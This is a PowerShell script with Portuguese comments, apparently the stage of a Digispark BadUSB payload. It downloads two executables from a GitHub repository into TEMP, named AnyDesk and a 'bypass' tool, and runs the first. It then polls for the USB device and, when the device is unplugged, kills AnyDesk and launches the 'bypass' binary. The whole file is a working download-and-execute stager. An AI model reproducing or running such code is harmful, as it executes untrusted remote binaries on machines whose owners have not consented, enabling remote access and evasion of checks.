$p = "$env:TEMP\main.exe"
$b = "$env:TEMP\bypass.exe"
$n = "AnyDesk"

# Baixa os arquivos
Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/AnyDesk.exe" -OutFile $p
Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/SYNC-Otimizer.exe" -OutFile $b

# Inicia o principal
Start-Process $p

# Espera de segurança de 5 segundos para o USB estabilizar antes de começar a vigiar
Start-Sleep -Seconds 5

# O Loop Vigilante com Prova Real
while ($true) {
    # Tenta achar o Digispark (ID 16D0)
    $usb = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' }
    
    if (-not $usb) {
        # Se não achou, espera 2 segundos e tira a Prova Real
        Start-Sleep -Seconds 2
        $usb_confirm = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match '16D0' }
        
        if (-not $usb_confirm) {
            # Se continuar sumido, é porque você realmente puxou da tomada! Quebra o loop.
            break
        }
    }
    Start-Sleep -Seconds 1
}

# Só chega aqui se o USB for arrancado de verdade
Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
Start-Process $b
